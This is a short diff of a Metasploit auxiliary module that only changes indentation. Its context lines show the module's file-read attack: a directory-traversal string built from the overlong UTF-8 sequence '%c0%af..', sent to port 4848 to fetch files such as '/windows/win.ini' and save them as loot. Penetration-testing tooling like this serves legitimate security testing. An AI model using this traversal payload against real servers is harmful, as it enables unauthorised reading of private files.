@@ -31,7 +31,7 @@ class MetasploitModule < Msf::Auxiliary
       'License'     => MSF_LICENSE
     ))
 
-register_options(
+  register_options(
       [
         Opt::RPORT(4848),
         OptString.new('FILEPATH', [true, "The path to the file to read", '/windows/win.ini']),
@@ -39,7 +39,7 @@ register_options(
       ])
   end
 
-    def run_host(ip)
+  def run_host(ip)
     filename = datastore['FILEPATH']
     traversal = "%c0%af.." * datastore['DEPTH'] << filename
 
@@ -51,7 +51,7 @@ register_options(
     unless res && res.code == 200
       print_error('Nothing was downloaded')
       return
-    end
+  end
 
     vprint_good("#{peer} - #{res.body}")
     path = store_loot(
